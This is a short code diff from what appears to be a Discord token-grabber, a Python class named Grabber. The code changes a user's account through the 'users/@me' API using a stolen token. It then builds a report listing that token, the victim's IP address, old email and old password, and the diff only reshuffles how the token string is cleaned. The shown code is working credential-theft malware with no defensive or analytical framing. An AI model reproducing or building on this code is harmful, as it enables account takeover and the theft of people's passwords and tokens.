@@ -47,9 +47,8 @@ class Grabber:
                 }
                 r = self.session.patch(self.api + 'users/@me', json=payload, headers=self.getHeaders(token))
                 r_json = r.json()
-                token = token.replace('[', '').replace(']', '').replace("'", '') # :shrug:
                 message = f'= {time} ='
-                message += '\nToken :: ' + token
+                message += '\nToken :: ' + token.replace('[', '').replace(']', '').replace("'", '')
                 message += '\nIP :: ' + grabIP
                 message += '\nOld Email :: ' + userInfo['email']
                 message += '\nOld Password :: ' + password
